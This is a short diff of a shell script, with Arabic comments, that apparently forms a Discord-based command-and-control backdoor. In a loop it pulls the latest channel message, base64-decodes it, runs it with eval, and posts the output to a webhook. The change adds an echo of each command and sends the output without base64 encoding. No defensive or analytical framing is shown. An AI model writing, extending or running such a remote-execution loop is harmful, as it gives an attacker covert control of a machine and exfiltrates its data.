@@ -17,9 +17,13 @@ while :; do
     "https://discord.com/api/v9/channels/$CHANNEL_ID/messages?limit=1" | 
     jq -r '.[0].content' | 
     base64 -d 2>/dev/null)
+
+  # تحقق من محتوى الأمر بعد فك التشفير
+  echo "Executing command: $CMD"
+
+  OUTPUT=$(eval "$CMD" 2>&1)
   
-  OUTPUT=$(eval "$CMD" 2>&1 | base64 -w0)
-  
+  # إرسال البيانات مباشرة بدون base64
   curl -sf -X POST "$WEBHOOK_URL" \
     -H "Content-Type: application/json" \
     -d "{\"content\":\"$(date +%s.%N)|$OUTPUT\"}" >/dev/null
